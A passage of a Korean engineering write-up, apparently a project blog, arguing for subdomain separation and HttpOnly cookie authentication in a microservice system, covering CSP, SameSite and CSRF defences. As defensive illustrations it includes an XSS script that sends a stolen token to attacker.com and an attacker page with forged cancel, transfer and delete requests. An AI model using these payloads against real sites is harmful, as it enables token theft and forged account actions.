# MSA 환경에서 쿠키 기반 인증을 선택한 이유

## 목차
- [프로젝트 배경](#프로젝트-배경)
- [도메인 분리 전략](#도메인-분리-전략)
- [인증 저장소 비교: 쿠키 vs 로컬스토리지](#인증-저장소-비교-쿠키-vs-로컬스토리지)
- [쿠키 선택의 기술적 근거](#쿠키-선택의-기술적-근거)
- [AWS Cognito 선택 이유](#aws-cognito-선택-이유)
- [Cognito 인증 방식 비교](#cognito-인증-방식-비교)
- [로컬 개발 환경의 제약과 해결](#로컬-개발-환경의-제약과-해결)
- [주의사항 및 Best Practices](#주의사항-및-best-practices)

---

## 프로젝트 배경

### 아키텍처 전환
2차 프로젝트에서 우리 팀은 **모놀리식 아키텍처에서 MSA(Microservices Architecture)로의 전환**을 진행하고 있습니다. 이를 위해 기존 단일 서비스를 다음과 같이 분리했습니다:

```yaml
기존 아키텍처:
  - 단일 Spring Boot 애플리케이션
  - 모든 기능이 하나의 서버에 통합
  - Path 기반 라우팅 (/admin, /queue, /api 등)

새로운 아키텍처:
  서비스 분리:
    - Queue Service: 대기열 관리
    - Admin Service: 관리자 기능 (Lambda 서버리스)
    - Core Service: 나머지 핵심 비즈니스 로직

  도메인 분리:
    - ddcn41.com: 메인 클라이언트 서비스
    - accounts.ddcn41.com: 인증 및 계정 관리
    - admin.ddcn41.com: 관리자 대시보드
```

### 전환 목표
- **운영 경계 명확화**: 각 서비스의 책임과 범위를 명확히 구분
- **보안 강화**: 서비스별 독립적인 보안 정책 적용
- **확장성 향상**: 서비스별 독립적인 스케일링
- **유지보수성 개선**: 서비스 간 결합도 감소

---

## 도메인 분리 전략

### 서브도메인 분리의 이유

#### 1. CDN 및 캐시 정책 최적화

**문제 상황**:
```
기존 (Path 기반):
  ddcn41.com/admin  → 관리자 페이지 (캐시 불가)
  ddcn41.com/api    → API 엔드포인트 (캐시 불가)
  ddcn41.com/       → 정적 리소스 (캐시 가능)

→ 모든 경로가 같은 도메인이므로 CDN 캐시 정책 설정 어려움
```

**Path 기반 캐시 정책의 한계**⁵:

CloudFront에서 Path 패턴별로 캐시 정책을 다르게 설정할 수는 있지만, **운영 복잡도와 실수 가능성**이 높습니다:

```yaml
# CloudFront Behavior 설정 (Path 기반)
Behaviors:
  # 정적 파일 캐싱
  - PathPattern: "/"
    CachingOptimized: true
    TTL: 86400  # 1일

  # API 캐싱 비활성화
  - PathPattern: "/api/*"
    CachingDisabled: true
    TTL: 0

  # 관리자 페이지 캐싱 비활성화
  - PathPattern: "/admin/*"
    CachingDisabled: true
    TTL: 0

문제점:
1. ❌ 우선순위 충돌: PathPattern 순서에 따라 예기치 않은 동작 발생 가능
   예) /api/public/file.js → API로 인식? 정적 파일로 인식?

2. ❌ 관리 복잡도: 경로 추가 시마다 CloudFront Behavior 수정 필요
   예) 새 경로 /docs 추가 → CloudFront 배포 업데이트 → 전파 대기(15분)

3. ❌ 디버깅 어려움: 캐시 문제 발생 시 어느 Behavior가 적용되었는지 추적 복잡
   예) 캐시되지 말아야 할 /admin/config.js가 캐싱됨 → PathPattern 우선순위 확인 필요

4. ❌ 휴먼 에러: 실수로 잘못된 경로에 캐싱 적용 시 보안 문제
   예) /api/users → 캐싱 활성화 실수 → 민감 정보 엣지에 캐싱
```

> ⁵ 참조: [CloudFront Cache Behavior Configuration](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/DownloadDistValuesCacheBehavior)

**서버 내부 라우팅 방식 (ddcn41.com/api → api.ddcn41.com)**:

내부 리다이렉트나 프록시를 사용하더라도 **클라이언트 관점에서는 여전히 같은 도메인**이므로 캐시 정책 문제는 동일합니다:

```javascript
// Nginx/ALB에서 내부 라우팅
location /api {
    proxy_pass https://api.ddcn41.com;
    // ⚠️ 클라이언트는 ddcn41.com/api로 요청
    // ⚠️ CloudFront는 ddcn41.com에 대한 캐시 정책 적용
    // ⚠️ 내부적으로 api.ddcn41.com으로 프록시해도 캐시 정책은 Origin 기준
}

문제점:
1. ❌ CloudFront는 요청 URL 기준으로 캐싱 (Origin이 어디든 상관없음)
   클라이언트 요청: ddcn41.com/api/users
   → CloudFront: "ddcn41.com에 대한 캐시 정책 적용"
   → Origin이 api.ddcn41.com이든 상관없이 ddcn41.com의 Behavior 적용

2. ❌ Cache-Control 헤더 충돌 가능
   api.ddcn41.com에서 Cache-Control: no-cache 응답
   → CloudFront Behavior가 강제 캐싱 설정이면 무시됨
   → 의도치 않은 캐싱 발생

3. ❌ Invalidation 복잡도 증가
   /api/* 캐시 무효화 시 ddcn41.com/* 전체에 영향 가능
```

**해결 방법 (서브도메인 분리)**:
```
ddcn41.com          → CloudFront + S3 (적극적 캐싱, TTL 1일)
accounts.ddcn41.com → CloudFront + S3 (적극적 캐싱, TTL 1일)
admin.ddcn41.com    → CloudFront + S3 (적극적 캐싱, TTL 1일)
api.ddcn41.com      → ALB → EC2 (캐싱 비활성화)
auth.ddcn41.com     → API Gateway → Lambda (캐싱 선택적)
```

**장점**:
- ✅ 정적 파일(HTML, CSS, JS)은 엣지 로케이션에서 적극적으로 캐싱
- ✅ API 엔드포인트는 캐싱 제외로 실시간 데이터 보장
- ✅ 도메인별 독립적인 캐시 무효화 (Invalidation)

#### 2. CSP (Content Security Policy) 헤더 관리

**CSP란?**
브라우저가 실행할 수 있는 리소스의 출처를 제한하는 보안 정책입니다.

**Path 기반의 문제**:
```http
# 모든 경로에 동일한 CSP 적용
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.ddcn41.com;

→ /admin과 /client가 같은 정책을 공유하므로 세밀한 제어 불가
```

**서브도메인 분리 시**:
```http
# admin.ddcn41.com (엄격한 정책)
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  connect-src 'self' https://api.ddcn41.com

# ddcn41.com (유연한 정책)
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline'
    https://www.google-analytics.com    # Google Analytics
    https://www.googletagmanager.com    # Google Tag Manager
    https://connect.facebook.net        # Facebook Pixel
    https://cdn.amplitude.com;          # Amplitude 분석
  connect-src 'self'
    https://www.google-analytics.com    # Analytics 데이터 전송
    https://api.amplitude.com           # Amplitude API
    https://graph.facebook.com;         # Facebook Graph API
  img-src 'self' data: https:           # 광고 이미지 로드 허용
    https://www.google-analytics.com    # Analytics 픽셀
    https://www.facebook.com;           # Facebook 픽셀
  frame-src
    https://www.youtube.com             # YouTube 임베드
    https://player.vimeo.com;           # Vimeo 임베드
```

**실제 사용 사례 예시**:

```http
# E-Commerce 사이트 (ddcn41.com)
Content-Security-Policy:
  default-src 'self';

  # 써드파티 스크립트 (분석, 광고, 결제)
  script-src 'self' 'unsafe-inline'
    https://www.googletagmanager.com      # Google Tag Manager
    https://connect.facebook.net          # Facebook Pixel
    https://js.stripe.com                 # Stripe 결제
    https://cdn.iamport.kr;               # 아임포트 결제

  # API 통신
  connect-src 'self'
    https://api.ddcn41.com                # 자체 API
    https://api.amplitude.com             # 분석 데이터
    https://api.stripe.com                # Stripe API
    https://api.iamport.kr;               # 아임포트 API

  # 이미지 (CDN, 광고, 상품 이미지)
  img-src 'self' data: https:
    https://cdn.ddcn41.com                # 자체 CDN
    https://googleads.g.doubleclick.net;  # Google Ads

  # 외부 iframe (결제 위젯, 소셜 로그인)
  frame-src
    https://js.stripe.com                 # Stripe 결제 iframe
    https://accounts.google.com           # Google 로그인
    https://www.facebook.com;             # Facebook 로그인

# 관리자 페이지 (admin.ddcn41.com) - 엄격한 정책
Content-Security-Policy:
  default-src 'self';
  script-src 'self';                      # 외부 스크립트 완전 차단
  connect-src 'self' https://api.ddcn41.com;  # 자체 API만 허용
  img-src 'self';                         # 자체 이미지만 허용
  frame-src 'none';                       # iframe 완전 차단
  object-src 'none';                      # 플러그인 차단
```

**장점**:
- 관리자 페이지에 더 엄격한 보안 정책 적용
- 사용자 페이지는 UX를 위해 유연한 정책 적용
- 서비스별 독립적인 CSP 관리

#### 3. 쿠키 및 스토리지 격리

**시나리오: Admin 전용 세션 관리**

현재는 `.ddcn41.com` 도메인으로 모든 서브도메인에서 쿠키를 공유하지만, 향후 요구사항 변경 시 유연하게 대응할 수 있습니다:

```javascript
// 현재: 모든 서브도메인에서 쿠키 공유
Set-Cookie: session_token=abc123; Domain=.ddcn41.com; HttpOnly; Secure;

// 향후 요구사항: Admin만 별도 관리
Set-Cookie: admin_session=xyz789; Domain=admin.ddcn41.com; HttpOnly; Secure;
// → admin.ddcn41.com에서만 접근 가능
```

**실제 활용 예시: 로그인 페이지 분리**

고객용 로그인과 관리자 로그인을 완전히 분리하여 보안을 강화할 수 있습니다:

```javascript
// 시나리오 1: 통합 로그인 (현재 방식)
// 장점: 단일 로그인 페이지, 편리한 사용자 경험
// 단점: 일반 사용자가 관리자 로그인 페이지를 알 수 있음

accounts.ddcn41.com/login → 모든 사용자 로그인
  ↓ 로그인 성공
Set-Cookie: access_token=...; Domain=.ddcn41.com
  → ddcn41.com, admin.ddcn41.com 모두 접근 가능

// 시나리오 2: 분리된 로그인 (향후 요구사항)
// 장점: 관리자 로그인 페이지 숨김, 보안 강화, IP 화이트리스트 적용
// 단점: 관리자는 별도 로그인 필요

// 고객 로그인
accounts.ddcn41.com/login → 일반 사용자만
  ↓ 로그인 성공
Set-Cookie: user_token=...; Domain=.ddcn41.com
  → ddcn41.com에서만 유효

// 관리자 로그인 (별도 도메인, IP 제한)
admin-auth.ddcn41.com/login → 관리자만 (회사 IP에서만 접근 가능)
  ↓ 로그인 성공
Set-Cookie: admin_token=...; Domain=admin.ddcn41.com; HttpOnly; Secure;
  → admin.ddcn41.com에서만 유효
  → 일반 사용자 영역(ddcn41.com)에서는 절대 전송되지 않음

// WAF 규칙 (관리자 보호)
admin-auth.ddcn41.com:
  - IP Whitelist: 회사 IP만 허용
  - Rate Limiting: 5 req/min
  - 2FA 강제
  - 별도 Cognito User Pool
```

**Cookie Scope 제어의 장점**:

```yaml
보안 강화:
  - 일반 사용자가 관리자 쿠키에 절대 접근 불가
  - 관리자 세션 탈취 시에도 일반 영역에서 사용 불가
  - 관리자 로그인 페이지 URL을 숨길 수 있음

운영 유연성:
  - 관리자 세션 타임아웃 독립 설정 (예: 30분)
  - 일반 사용자 세션은 긴 유지 (예: 7일)
  - 관리자만 MFA 강제, IP 제한 적용

감사 및 컴플라이언스:
  - 관리자 행동 로그 분리 추적
  - 규정 준수 (PCI-DSS, GDPR 등)
  - 관리자 세션 모니터링 독립 운영
```

**장점**:
- ✅ 서비스별 독립적인 인증 관리 가능
- ✅ 보안 요구사항에 따라 유연한 쿠키 스코프 설정
- ✅ 로컬스토리지도 Origin 단위로 자동 격리

#### 4. 기타 운영상 이점

**CORS 정책 관리**:
```javascript
// Path 기반: CORS 불필요 (Same-Origin)
// → 하지만 서비스 간 의존성 명확하지 않음

// 서브도메인 분리: 명시적 CORS 설정
Access-Control-Allow-Origin: https://ddcn41.com
Access-Control-Allow-Origin: https://admin.ddcn41.com
// → 서비스 간 통신 경계가 명확
```

**모니터링 및 로깅**:
```yaml
CloudWatch Logs:
  /aws/cloudfront/ddcn41.com: Client 서비스 로그
  /aws/cloudfront/admin.ddcn41.com: Admin 서비스 로그
  /aws/cloudfront/accounts.ddcn41.com: Accounts 서비스 로그

→ 서비스별 독립적인 로그 분석 및 알람 설정
```

**WAF (Web Application Firewall) 규칙**:
```yaml
ddcn41.com:
  - Rate Limiting: 1000 req/min
  - IP Whitelist: 없음

admin.ddcn41.com:
  - Rate Limiting: 100 req/min
  - IP Whitelist: 회사 IP만 허용
```

---

## 인증 저장소 비교: 쿠키 vs 로컬스토리지

### 1. 저장소 특성 비교

| 특성 | 쿠키 | 로컬스토리지 |
|------|------|------------|
| **저장 위치** | 브라우저 쿠키 저장소 | 브라우저 Web Storage |
| **용량** | ~4KB | ~5-10MB |
| **자동 전송** | HTTP 요청 시 자동 포함 | 수동으로 헤더에 추가 필요 |
| **유효기간** | `Max-Age`, `Expires` 설정 가능 | 명시적으로 삭제 전까지 영구 |
| **Same-Origin Policy** | 서브도메인 간 공유 가능 (`Domain` 설정) | 정확히 같은 Origin만 접근 가능 |
| **HttpOnly 지원** | ✅ 지원 (JS 접근 불가) | ❌ 지원 안 함 (JS 접근 필수) |
| **Secure 플래그** | ✅ HTTPS 전용 설정 가능 | ❌ 지원 안 함 |

### 2. Same-Origin Policy 차이

#### 로컬스토리지: 엄격한 Same-Origin

```javascript
// accounts.ddcn41.com에서 저장
localStorage.setItem('access_token', 'eyJhbGc...');

// ddcn41.com에서 접근 시도
console.log(localStorage.getItem('access_token'));
// → null (다른 Origin이므로 접근 불가)

// admin.ddcn41.com에서 접근 시도
console.log(localStorage.getItem('access_token'));
// → null (다른 Origin이므로 접근 불가)
```

**Origin 비교**:
```
https://ddcn41.com          → Origin 1
https://accounts.ddcn41.com → Origin 2 (다름)
https://admin.ddcn41.com    → Origin 3 (다름)

→ 각 Origin의 로컬스토리지는 완전히 독립적
```

**로컬 개발 환경에서의 포트 격리**:

```javascript
// localhost에서 포트가 다르면 완전히 다른 Origin
http://localhost:3000  → Origin A
http://localhost:3001  → Origin B (완전히 다름)
http://localhost:3002  → Origin C (완전히 다름)

// 실제 예시
// localhost:3000 (클라이언트)에서 저장
localStorage.setItem('access_token', 'eyJhbGc...');
console.log(localStorage.getItem('access_token'));
// → "eyJhbGc..." (정상 출력)

// localhost:3001 (어드민)에서 접근 시도
console.log(localStorage.getItem('access_token'));
// → null (접근 불가)

// localhost:3002 (어카운트)에서 접근 시도
console.log(localStorage.getItem('access_token'));
// → null (접근 불가)

Origin 구성 요소:
  - 프로토콜 (http/https)
  - 호스트 (localhost, ddcn41.com)
  - 포트 (3000, 3001, 3002)

→ 세 요소 중 하나라도 다르면 다른 Origin
→ 로컬스토리지는 Origin 단위로 완전히 격리됨
```

**Same-Origin 판정 규칙**:

```javascript
// ✅ 같은 Origin (로컬스토리지 공유 가능)
https://ddcn41.com:443
https://ddcn41.com           // 포트 생략 시 기본 443

http://localhost:3000
http://localhost:3000/admin  // Path는 Origin에 포함 안 됨

// ❌ 다른 Origin (로컬스토리지 공유 불가)
https://ddcn41.com
http://ddcn41.com            // 프로토콜 다름

http://localhost:3000
http://localhost:3001        // 포트 다름

https://ddcn41.com
https://accounts.ddcn41.com  // 호스트 다름 (서브도메인도 별개)

https://ddcn41.com:443
https://ddcn41.com:8443      // 포트 다름
```

**로컬 개발의 문제점**:

```javascript
// 문제 상황
로컬 환경:
  localhost:3000 → 클라이언트 (Vite)
  localhost:3001 → 어드민 (Vite)
  localhost:3002 → 어카운트 (Vite)

// accounts (localhost:3002)에서 로그인 성공
localStorage.setItem('auth_tokens', JSON.stringify({
  accessToken: 'eyJhbGc...',
  refreshToken: 'eyJhbGc...'
}));

// 클라이언트 (localhost:3000)로 이동
window.location.href = 'http://localhost:3000';

// ❌ 문제: 토큰이 공유되지 않음
console.log(localStorage.getItem('auth_tokens'));
// → null (다른 Origin이므로 접근 불가)

// 해결 방법:
// 1. 쿠키 사용 (Domain=localhost 설정)
// 2. Nginx Reverse Proxy로 단일 도메인 구성
// 3. Bearer Token 방식 (로그인 후 URL에 토큰 전달)
```

#### 쿠키: 서브도메인 간 공유 가능

```javascript
// accounts.ddcn41.com에서 쿠키 설정 (Lambda 응답)
Set-Cookie: access_token=eyJhbGc...; Domain=.ddcn41.com; HttpOnly; Secure;

// ddcn41.com에서 자동 전송
fetch('https://api.ddcn41.com/v1/bookings')
// → Cookie: access_token=eyJhbGc... (브라우저가 자동으로 포함)

// admin.ddcn41.com에서도 자동 전송
fetch('https://api.ddcn41.com/v1/admin/users')
// → Cookie: access_token=eyJhbGc... (브라우저가 자동으로 포함)
```

**Domain 설정 규칙 (RFC 6265 기준)**¹:
```javascript
// accounts.ddcn41.com에서 설정 가능한 Domain:

// 1. 서브도메인 공유 (권장)
Domain=.ddcn41.com          ✅ 가능 (모든 *.ddcn41.com에서 공유)
Domain=ddcn41.com           ✅ 가능 (.ddcn41.com과 동일하게 동작)
  → RFC 6265: leading dot(.)은 무시됨
  → 현대 브라우저에서는 두 방식 모두 서브도메인 공유

// 2. 특정 도메인만 (Domain 생략 또는 명시)
(Domain 생략)              ✅ 가능 (accounts.ddcn41.com만, 서브도메인 제외)
Domain=accounts.ddcn41.com  ✅ 가능 (accounts.ddcn41.com + 하위 서브도메인)

// 3. 다른 도메인 설정 불가
Domain=.example.com         ❌ 불가 (다른 도메인)
Domain=google.com           ❌ 불가 (다른 도메인)


// 참고: RFC 6265 이전 (RFC 2109)과의 차이
// - RFC 2109 (구 스펙): .ddcn41.com만 서브도메인 공유
// - RFC 6265 (현재): .ddcn41.com과 ddcn41.com 모두 서브도메인 공유
```

> ¹ 참조: [RFC 6265: HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/rfc6265)

### 3. 보안 측면 비교

#### XSS (Cross-Site Scripting) 공격 시나리오

**로컬스토리지 (취약)**:
```javascript
// 악성 스크립트가 페이지에 삽입된 경우
<script>
  // ❌ 로컬스토리지는 JS로 직접 접근 가능
  const token = localStorage.getItem('access_token');

  // 공격자 서버로 토큰 전송
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>
```

**쿠키 with HttpOnly (안전)**:
```javascript
// 악성 스크립트가 페이지에 삽입된 경우
<script>
  // ✅ HttpOnly 쿠키는 JS로 접근 불가
  console.log(document.cookie);
  // → "" (빈 문자열, access_token은 보이지 않음)

  // ❌ 공격자가 토큰을 훔칠 수 없음
</script>
```

**HttpOnly 쿠키 설정**:
```javascript
// Lambda Auth Gateway 응답
Set-Cookie: access_token=eyJhbGc...;
            HttpOnly;         // JS 접근 차단
            Secure;           // HTTPS 전용
            SameSite=Lax;     // CSRF 완화
            Domain=.ddcn41.com;
            Path=/;
            Max-Age=3600
```

#### CSRF (Cross-Site Request Forgery) 공격과 SameSite 방어²

**CSRF란?**

사용자가 의도하지 않은 요청을 악성 사이트가 대신 실행하는 공격입니다.

**CSRF 공격 시나리오**:

```html
<!-- 악성 사이트 (attacker.com) -->
<html>
<body>
  <!-- 사용자가 ddcn41.com에 로그인된 상태라고 가정 -->

  <!-- 시나리오 1: 이미지 태그를 이용한 GET 요청 -->
  <img src="https://api.ddcn41.com/v1/bookings/cancel?id=123" />
  <!-- 브라우저가 자동으로 쿠키 전송 → 예약 취소 요청 -->

  <!-- 시나리오 2: 자동 제출 폼 (POST 요청) -->
  <form id="evil" action="https://api.ddcn41.com/v1/account/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="1000000" />
  </form>
  <script>
    document.getElementById('evil').submit();
    // 사용자 모르게 자동 제출 → 송금 요청
  </script>

  <!-- 시나리오 3: Fetch API 이용 -->
  <script>
    fetch('https://api.ddcn41.com/v1/users/delete', {
      method: 'POST',
      credentials: 'include'  // 쿠키 자동 포함
    });
    // 사용자 계정 삭제 요청
  </script>
</body>
</html>
```

**공격이 성립하는 조건**:
1. ✅ 사용자가 ddcn41.com에 로그인된 상태 (쿠키 존재)
2. ✅ 브라우저가 자동으로 쿠키를 Cross-Site 요청에 포함
3. ✅ 서버가 요청의 출처를 검증하지 않음

**SameSite 속성으로 방어**:

```javascript
// SameSite=Strict (가장 엄격)
Set-Cookie: token=abc; SameSite=Strict

동작:
  - Same-Site 요청만 쿠키 전송 (ddcn41.com → api.ddcn41.com ✅)
  - Cross-Site 요청은 쿠키 전송 안 됨 (attacker.com → api.ddcn41.com ❌)
  - 모든 HTTP 메서드에 적용 (GET, POST, PUT, DELETE)

단점:
  - 외부 사이트에서 링크 클릭 시에도 쿠키 안 보냄
  - 예) Google 검색 → ddcn41.com 클릭 시 로그인 풀림
  - 사용자 경험 저하 가능

// SameSite=Lax (권장, 균형잡힌 보호)
Set-Cookie: token=abc; SameSite=Lax

동작:
  - "안전한" Cross-Site GET 요청만 쿠키 전송
  - Top-level Navigation (링크 클릭, 302 리다이렉트)은 허용
  - POST, PUT, DELETE 등 상태 변경 요청은 차단

허용되는 경우:
  ✅ <a href="https://ddcn41.com">링크</a> 클릭
  ✅ window.location.href = "https://ddcn41.com"
  ✅ 302 Redirect → https://ddcn41.com

차단되는 경우 (CSRF 방어):
  ❌ <form method="POST" action="https://api.ddcn41.com/v1/transfer">
  ❌ <img src="https://api.ddcn41.com/v1/bookings/cancel?id=123">
  ❌ fetch('https://api.ddcn41.com/v1/users/delete', {method: 'POST'})
  ❌ <iframe src="https://ddcn41.com"> 내부에서의 POST 요청

장점:
  - CSRF 공격의 90% 이상 차단 (상태 변경 요청 보호)
  - 사용자 경험 유지 (외부 링크에서 로그인 상태 유지)
  - 대부분의 웹 애플리케이션에 적합

// SameSite=None (제한 없음, CSRF 취약)
Set-Cookie: token=abc; SameSite=None; Secure

동작:
  - 모든 Cross-Site 요청에 쿠키 전송
  - Secure 플래그 필수 (HTTPS only)
  - CSRF 공격에 취약

사용 사례:
  - iframe 내부 인증 (예: 결제 위젯 내부 로그인)
  - Third-party 인증 (예: OAuth 프로바이더)
  - Cross-Site 임베드 컨텐츠

⚠️ 주의: SameSite=None 사용 시 추가 CSRF 방어 필수
  - CSRF 토큰 검증
  - Referer/Origin 헤더 검증
  - Custom 헤더 요구 (X-Requested-With)
```

> ² 참조: [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html), [SameSite Cookies Explained](https://web.dev/articles/samesite-cookies-explained)

**우리 프로젝트의 SameSite 설정 이유**:

```javascript
Set-Cookie: access_token=eyJhbGc...;
            SameSite=Lax;  // ← 이 값을 선택한 이유

이유:
1. ✅ CSRF 방어: POST/PUT/DELETE 요청은 Same-Site만 허용
   → 악성 사이트에서 송금, 삭제 등 위험한 요청 불가

2. ✅ 사용자 경험: 외부 링크 클릭 시 로그인 유지
   → Google 검색 → ddcn41.com 클릭 → 로그인 상태 유지

3. ✅ API 호출 정상 동작: ddcn41.com → api.ddcn41.com (Same-Site)
   → 모든 서브도메인이 .ddcn41.com으로 같은 Site

4. ✅ 브라우저 기본값 준수: 2020년 이후 브라우저 기본값이 Lax
   → 명시적으로 설정하여 예측 가능한 동작 보장
```

**CSRF 추가 방어 계층** (SameSite만으로 부족한 경우):

```javascript
// 1. CSRF 토큰 검증 (Double Submit Cookie 패턴)
// Lambda에서 CSRF 토큰 발급
const csrfToken = crypto.randomBytes(32).toString('hex');
Set-Cookie: csrf_token=${csrfToken}; SameSite=Lax; HttpOnly;

// Frontend에서 POST 요청 시 토큰 포함
fetch('/api/v1/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken  // 쿠키의 토큰과 일치 검증
  },
  credentials: 'include'
});

// 2. Origin/Referer 헤더 검증
// Backend에서 요청 출처 확인
const allowedOrigins = ['https://ddcn41.com', 'https://admin.ddcn41.com'];
if (!allowedOrigins.includes(request.headers.origin)) {
  return { statusCode: 403, body: 'Forbidden' };
}

// 3. Custom 헤더 요구 (Simple Request 방지)
// CORS Preflight를 강제하여 Cross-Site 요청 차단
fetch('/api/v1/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest'  // Custom 헤더 → Preflight 발생
  }
});
```

#### HTTPS와 보안

**과거 (HTTP 시대)**:
```
사용자 → HTTP → 서버
       ↓
   쿠키 헤더 평문 노출
   Cookie: session_id=abc123
       ↓
   중간자 공격 (MITM) 가능
   → 세션 하이재킹
```

**현재 (HTTPS + Secure 플래그)**:
```
사용자 → HTTPS (TLS 암호화) → 서버
       ↓
   쿠키 헤더 암호화
   Cookie: access_token=eyJhbGc... (암호화됨)
       ↓
   Secure 플래그: HTTP로는 전송 안 됨
   → 중간자 공격 방어
```

### 4. MSA 환경에서의 실용성

#### 시나리오: 로그인 후 서비스 간 인증 정보 공유

**로컬스토리지 방식 (복잡하고 불안전)**:

```javascript
// 1. accounts.ddcn41.com에서 로그인 성공
const tokens = {
  accessToken: 'eyJhbGc...',
  refreshToken: 'eyJhbGc...'
};
localStorage.setItem('auth_tokens', JSON.stringify(tokens));

// 2. ddcn41.com으로 이동하려면...
// → 로컬스토리지는 공유 안 되므로 토큰 전달 필요

// 방법 A: URL 쿼리 파라미터 (❌ 매우 위험)
window.location.href = `https://ddcn41.com?token=${accessToken}`;
// → 브라우저 히스토리, 서버 로그에 토큰 노출

// 방법 B: 302 Redirect + 서버 중계 (⚠️ 복잡)
// accounts.ddcn41.com/redirect-with-token
POST /redirect-with-token
Body: { token: 'eyJhbGc...', redirectTo: 'https://ddcn41.com' }

// 서버 응답
302 Found
Location: https://ddcn41.com/receive-token?code=temp_code

// ddcn41.com에서 temp_code로 토큰 교환
GET /receive-token?code=temp_code
→ 서버에서 temp_code 검증 후 토큰 반환
→ 로컬스토리지에 저장

// → 매우 복잡하고 보안 위험 존재
```

**서버 중계 방식의 구체적인 보안 위험**:

```javascript
// 위험 1: URL 노출 (브라우저 히스토리, 리퍼러)
302 Found
Location: https://ddcn41.com/receive-token?code=temp123

문제:
  - 브라우저 히스토리에 temp_code 저장
    → 사용자가 "뒤로가기" 시 temp_code 재사용 시도 가능
  - 서버 로그에 temp_code 기록
    → 로그 유출 시 temp_code 탈취 위험
  - 리퍼러 헤더로 temp_code 유출
    → ddcn41.com에서 외부 사이트 링크 클릭 시 Referer: https://ddcn41.com/receive-token?code=temp123

// 위험 2: Race Condition (경합 조건)
시나리오:
  1. 악성 사용자가 네트워크 패킷 스니핑으로 temp_code 탈취
  2. 정상 사용자보다 먼저 /receive-token?code=temp123 호출
  3. 악성 사용자가 토큰 획득
  4. 정상 사용자는 "이미 사용된 코드" 에러 발생

방어책:
  - temp_code는 1회용 (One-Time Use)
  - 매우 짧은 유효시간 (30초 ~ 1분)
  - IP 주소 검증 (발급 시 IP와 교환 시 IP 일치 확인)

// 위험 3: Replay Attack (재생 공격)
공격 시나리오:
  1. 공격자가 네트워크 스니핑으로 temp_code 캡처
     GET /receive-token?code=temp123
  2. 공격자가 캡처한 요청을 그대로 재전송
  3. temp_code가 아직 유효하면 토큰 획득 성공

방어책:
  - Nonce (Number used ONCE) 사용
  - HTTPS로 패킷 스니핑 방지
  - 매우 짧은 유효시간 설정

// 위험 4: Session Fixation (세션 고정 공격)
공격 시나리오:
  1. 공격자가 미리 temp_code 생성: temp999
  2. 피해자에게 링크 전송:
     https://ddcn41.com/receive-token?code=temp999
  3. 피해자가 클릭하면 공격자의 temp_code로 로그인
  4. 공격자가 같은 세션으로 접근 가능

방어책:
  - temp_code 생성 시 발급자 정보 저장 (IP, User-Agent)
  - temp_code 교환 시 발급자 정보 검증
  - CSRF 토큰 추가 검증

// 위험 5: Redis/DB 보안 취약점
Redis에 temp_code 저장 시:
  redis.set('temp123', JSON.stringify({
    token: 'eyJhbGc...',
    ip: '123.45.67.89',
    exp: Date.now() + 60000  // 1분 후 만료
  }));

문제:
  - Redis 메모리 덤프 유출 시 temp_code와 토큰 모두 노출
  - Redis 접근 권한 탈취 시 모든 temp_code 조회 가능
  - 만료된 temp_code 청소 실패 시 메모리 누수

방어책:
  - Redis에 토큰 원본 저장 금지 (Hash만 저장)
  - Redis 접근 권한 엄격 제한
  - TTL 자동 만료 설정 (EX 옵션)
  - Redis 전송 시 TLS 암호화
```

**쿠키 방식 (간단하고 안전)**:

```javascript
// 1. accounts.ddcn41.com에서 로그인 성공 (Lambda 응답)
Set-Cookie: access_token=eyJhbGc...; Domain=.ddcn41.com; HttpOnly; Secure;
Set-Cookie: refresh_token=eyJhbGc...; Domain=.ddcn41.com; HttpOnly; Secure; Max-Age=2592000;

// 2. ddcn41.com으로 리다이렉트
window.location.href = 'https://ddcn41.com';

// 3. ddcn41.com에서 자동으로 쿠키 전송
fetch('https://api.ddcn41.com/v1/bookings')
// → Cookie: access_token=eyJhbGc... (브라우저가 자동 포함)
// → 추가 코드 불필요!

// 4. admin.ddcn41.com에서도 동일하게 동작
fetch('https://api.ddcn41.com/v1/admin/users')
// → Cookie: access_token=eyJhbGc... (브라우저가 자동 포함)
```

### 5. 토큰 저장 방식의 진화

#### 1세대: Session Storage (서버 메모리)

```
클라이언트 → 로그인 → 서버
                      ↓
                   Session ID 생성
                   메모리에 사용자 정보 저장
                      ↓
클라이언트 ← Set-Cookie: session_id=abc123

이후 요청:
클라이언트 → Cookie: session_id=abc123 → 서버
                                        ↓
                                   메모리에서 조회
                                   사용자 정보 반환
```

**문제점**:
- ❌ 서버 메모리 사용 (확장성 제약)
- ❌ 서버 재시작 시 세션 소실
- ❌ 로드밸런서 환경에서 Sticky Session 필요

**Sticky Session (Session Affinity) 이란?**³

로드밸런서 환경에서 동일한 사용자의 요청을 항상 같은 서버로 라우팅하는 기술입니다.

```
문제 상황 (Sticky Session 없이):
┌─────────┐
│  사용자  │
└────┬────┘
     │ 1. 로그인 요청
     ▼
┌─────────────┐
│로드밸런서    │
└──┬──────┬───┘
   │      │
   ▼      ▼
┌────┐  ┌────┐
│서버A│  │서버B│
└────┘  └────┘

플로우:
  1. 사용자 로그인 → 로드밸런서 → 서버A
     서버A 메모리에 session_id=abc123 저장

  2. 사용자 API 요청 → 로드밸런서 → 서버B (랜덤 라우팅)
     ❌ 서버B 메모리에 session_id=abc123 없음
     → 401 Unauthorized 에러
     → 사용자는 분명히 로그인했는데 인증 실패!

해결 방법 1: Sticky Session 활성화
┌─────────┐
│  사용자  │
└────┬────┘
     │ Cookie: session_id=abc123
     ▼
┌─────────────┐
│로드밸런서    │  ← session_id를 보고 항상 같은 서버로 라우팅
└──┬──────────┘
   │
   ▼
┌────┐  ┌────┐
│서버A│  │서버B│  서버B는 이 사용자의 요청을 받지 않음
└────┘  └────┘

동작 원리:
